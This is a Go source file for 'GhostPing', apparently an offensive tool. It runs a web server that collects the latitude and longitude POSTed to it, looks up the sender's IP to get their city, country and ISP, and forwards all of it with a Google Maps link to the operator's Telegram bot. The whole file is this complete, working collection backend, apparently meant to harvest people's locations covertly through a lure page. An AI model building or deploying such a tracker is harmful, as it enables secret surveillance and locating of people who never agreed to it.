package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

type IPInfo struct {
	City    string `json:"city"`
	Country string `json:"country"`
	ISP     string `json:"isp"`
}

// Para aceitar float ou string no JSON
type LocationRequest struct {
	Latitude  json.Number `json:"latitude"`
	Longitude json.Number `json:"longitude"`
}

type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

var (
	botToken string
	chatID   string
	port     int
	help     bool
)

func init() {
	flag.StringVar(&botToken, "token", "", "Telegram bot token")
	flag.StringVar(&chatID, "chat", "", "Telegram chat ID")
	flag.IntVar(&port, "port", 8088, "Port to run the server")
	flag.BoolVar(&help, "h", false, "Show usage")
	flag.BoolVar(&help, "help", false, "Show usage (alias)")
}

func usage() {
	fmt.Println("\033[32m" + `
 @@@@@@@@  @@@  @@@   @@@@@@    @@@@@@   @@@@@@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@  
@@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@  
!@@        @@!  @@@  @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@!@!@@@  !@@        
!@!        !@!  @!@  !@!  @!@  !@!         !@!    !@!  @!@  !@!  !@!!@!@!  !@!        
!@! @!@!@  @!@!@!@!  @!@  !@!  !!@@!!      @!!    @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!     !!!    !!@!!!    !!!  !@!  !!!  !!! !!@!!  
:!!   !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!:  !!:  !!!  :!!   !!:  
:!:   !::  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  :!:  !:!  :!:   !::  
 ::: ::::  ::   :::  ::::: ::  :::: ::      ::     ::        ::   ::   ::   ::: ::::  
 :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :   
                                                                                      
       by k4rkarov (v1.0)
` + "\033[0m")
	fmt.Println("")
	fmt.Println("Usage: ghostping [options]")
	fmt.Println("")
	fmt.Println("Options:")
	fmt.Println("  -token <TOKEN>   Telegram bot token (required)")
	fmt.Println("  -chat <CHAT_ID>  Telegram chat ID (required)")
	fmt.Println("  -port <PORT>     Port to run the server (default: 8088)")
	fmt.Println("  -h, --help       Show this help message")
	fmt.Println("")
	fmt.Println("Description:")
	fmt.Println("	GhostPing listens for POST requests on /send-location.")
	fmt.Println("	It extracts latitude and longitude from the JSON body,")
	fmt.Println("	resolves the client’s IP into city/country/ISP details,")
	fmt.Println("	then pushes a formatted message to your Telegram bot.")
	fmt.Println("")
}

func getIP(r *http.Request) string {
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err == nil {
			ip = host
		} else {
			ip = r.RemoteAddr
		}
	}
	if strings.Contains(ip, ",") {
		ip = strings.Split(ip, ",")[0]
	}
	return strings.TrimSpace(ip)
}

func enrichIP(ip string) (*IPInfo, error) {
	resp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var info IPInfo
	if err := json.Unmarshal(body, &info); err != nil {
		return nil, err
	}
	return &info, nil
}

func sendToTelegram(msg TelegramMessage, token string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	jsonMsg, _ := json.Marshal(msg)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonMsg))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Telegram API error: %s", string(body))
	}
	return nil
}

func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var loc LocationRequest
	if err := json.NewDecoder(r.Body).Decode(&loc); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	ip := getIP(r)
	ipInfo, err := enrichIP(ip)
	if err != nil {
		log.Printf("Failed to enrich IP: %v", err)
		ipInfo = &IPInfo{}
	}

	lat := loc.Latitude.String()
	lon := loc.Longitude.String()
	mapsLink := "Coordinates not available"
	if lat != "" && lon != "" {
		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%s,%s)", lat, lon)
	}

	message := fmt.Sprintf(`
📍 *Location Received:*
Latitude: %s
Longitude: %s

🌐 *IP:* %s
🏙 *City:* %s
🏳 *Country:* %s
📡 *ISP:* %s

🔗 %s
`,
		emptyIf(lat, "Not provided"),
		emptyIf(lon, "Not provided"),
		ip,
		emptyIf(ipInfo.City, "N/A"),
		emptyIf(ipInfo.Country, "N/A"),
		emptyIf(ipInfo.ISP, "N/A"),
		mapsLink,
	)

	msg := TelegramMessage{
		ChatID:    chatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	if err := sendToTelegram(msg, botToken); err != nil {
		log.Printf("Error sending to Telegram: %v", err)
		http.Error(w, "Failed to send message", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"success": true}`))
}

func emptyIf(val, def string) string {
	if val == "" {
		return def
	}
	return val
}

func main() {
	flag.Parse()

	if len(os.Args) == 1 {
		fmt.Println("\033[31mError: no parameters provided\033[0m")
		fmt.Println("Please check: ghostping -h/--help")
		os.Exit(1)
	}

	if help {
		usage()
		os.Exit(0)
	}

	if botToken == "" || chatID == "" {
		fmt.Println("\033[31mError: -token and -chat are required\033[0m")
		usage()
		os.Exit(1)
	}

	http.HandleFunc("/send-location", sendLocationHandler)

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	log.Printf("Server running on port %d...", port)
	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
